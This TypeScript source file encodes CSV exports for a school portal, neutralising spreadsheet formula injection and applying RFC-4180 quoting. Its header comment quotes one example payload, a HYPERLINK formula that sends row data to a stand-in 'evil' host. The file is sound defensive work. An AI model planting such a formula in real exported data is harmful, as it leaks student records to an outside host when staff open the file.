// Shared CSV *output* encoding for the portal's data exports (class reports,
// comprehension evals, …). This is the trust boundary where stored student
// data — names, class names, AI summaries — becomes a spreadsheet file a staff
// member opens in Excel/Sheets, so both defences live here in one place:
//
//   1. Formula-injection neutralisation. A cell beginning with = + - @ or a
//      tab/CR is a formula to Excel/Sheets. A student imported (or typed) as
//      `=HYPERLINK("https://evil/"&C2,"CLICK")` would otherwise execute on
//      open — exfiltrating row data via HYPERLINK/WEBSERVICE, or worse via DDE.
//      We prefix a single quote, which the spreadsheet strips on display and
//      treats the cell as literal text (OWASP "CSV Injection" mitigation).
//   2. RFC-4180 quoting for embedded quotes, commas and newlines.
//
// Numbers are emitted as-is: a numeric cell can't be a formula, and prefixing
// a quote would corrupt legitimate values (e.g. a negative total).
//
// Mirrors admin/src/lib/utils/export.ts — keep the two in sync.
// scripts/check-csv-exports.sh fails the build if either loses the formula
// defence, or if a new export is written that bypasses these helpers.
//
// csv-export-guardrail: formula-safe-encoder

const FORMULA_TRIGGER = /^[=+\-@\t\r]/;
const NEEDS_QUOTING = /[",\n\r]/;

/** Encode one cell: formula-safe, then RFC-4180-quoted. */
export function csvCell(value: string | number | null | undefined): string {
  if (value == null) return '';
  if (typeof value === 'number') return Number.isFinite(value) ? String(value) : '';

  let s = value;
  if (FORMULA_TRIGGER.test(s)) s = `'${s}`;
  return NEEDS_QUOTING.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/** Encode a whole grid into CRLF-delimited CSV text (no BOM — callers add it). */
export function toCsv(rows: Array<Array<string | number | null | undefined>>): string {
  return rows.map((row) => row.map(csvCell).join(',')).join('\r\n');
}
